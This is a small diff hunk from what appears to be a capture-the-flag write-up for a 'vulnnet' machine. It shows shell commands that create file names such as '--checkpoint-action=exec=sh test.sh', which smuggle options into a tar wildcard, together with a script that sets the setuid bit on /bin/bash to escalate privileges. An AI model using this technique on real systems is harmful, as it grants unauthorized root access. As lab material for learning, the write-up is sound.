@@ -372,7 +372,6 @@ LETS CHECK GTFOBINS
 server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh test.sh"
 server-management@vulnnet:~/Documents$ echo "" > --checkpoint=1
 server-management@vulnnet:~/Documents$ echo "chmod +s /bin/bash" > test.sh
-server-management@vulnnet:~/Documents$ 
 
 MAKING THESE FILES IN THE DIRECTORY
 server-management@vulnnet:~/Documents$ ls -la /bin/bash 
